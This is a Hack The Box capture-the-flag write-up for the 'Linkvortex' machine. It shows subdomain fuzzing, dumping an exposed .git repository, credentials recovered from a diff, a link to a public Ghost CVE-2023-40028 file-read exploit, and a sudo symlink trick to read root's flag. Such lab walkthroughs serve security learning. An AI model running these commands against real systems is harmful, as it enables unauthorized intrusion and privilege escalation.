---
title: "Linkvortex"
date: 2023-12-29
categories: HTB
tags: ["linkvortex", "htb walkthrough", "ctf", "cybersecurity", "hackthebox", "htb writeup", "penetration testing", "writeup", "htb"]
---

# Linkvortex

# Credentials
| Username | Password | Hash | Source |
| -------- | -------- | ---- | ------ |
|          |          |      |        |
# Notes


# Enumeration
- Fuzzing subdomain gave `dev.linkvortex.htb`
- `git diff --staged` provides credentials.
- Logging into the admin panel with the credentials shows the version number

# Directory Fuzzing
```text
http://linkvortex.htb/ghost/assets/
http://linkvortex.htb/assets/
http://dev.linkvortex.htb/.git

ffuf -u http://linkvortex.htb -H "Host: FUZZ.linkvortex.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```

![[Pasted image 20250117125044.png]]
# Screenshots

http://dev.linkvortex.htb
![[Pasted image 20250117124820.png]]

http://linkvortex.htb/ghost/assets/
![[Pasted image 20250117124508.png]]
http://linkvortex.htb/assets/
![[Pasted image 20250117124548.png]]

![[Pasted image 20250117123835.png]]

# Git
```sh
git-dumper http://dev.linkvortex.htb/.git ~/LinkVortex/git
```

![[Pasted image 20250117125449.png]]
```text
0000000000000000000000000000000000000000 299cdb4387763f850887275a716153e84793077d root <dev@linkvortex.htb> 1730322603 +0000	clone: from https://github.com/TryGhost/Ghost.git
```

![[Pasted image 20250117134405.png]]


![[Pasted image 20250117134450.png]]

```text
const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
```

![[Pasted image 20250117140032.png]]

> `admin@linkvortex.htb` worked for the password `OctopiFociPilfer45`

![[Pasted image 20250117140928.png]]

https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/CVE-2023-40028

![[Pasted image 20250117141249.png]]

From git
![[Pasted image 20250117142242.png]]

![[Pasted image 20250117142322.png]]

New credentials found

```text
bob@linkvortex.htb
fibber-talented-worth
```

![[Pasted image 20250117142436.png]]



# Foothold
- CVE 2023-40028 arbitrary file read
- Looking at file output on the git command shows another credentials.
- SSH as bob user.

# Lateral Movement
- N/A

# Privilege Escalation
- Running *lse.sh* shows that the bob user can run `/opt/ghost/clean_symlink.sh` script on all png files.
- `ln -s` to create a symlink on `/root/root/txt`

![[Pasted image 20250117142920.png]]
![[Pasted image 20250117143148.png]]

# clean_symlink.sh
![[Pasted image 20250117143436.png]]

`ln -s ` : Creating a symlink 

```sh
bob@linkvortex:~$ ln -s /root/root.txt abc.txt
bob@linkvortex:~$ ln -s /home/bob/abc.txt abc.png
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hyh.png
```

```sh
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/abc.png
```

![[Pasted image 20250117144045.png]]
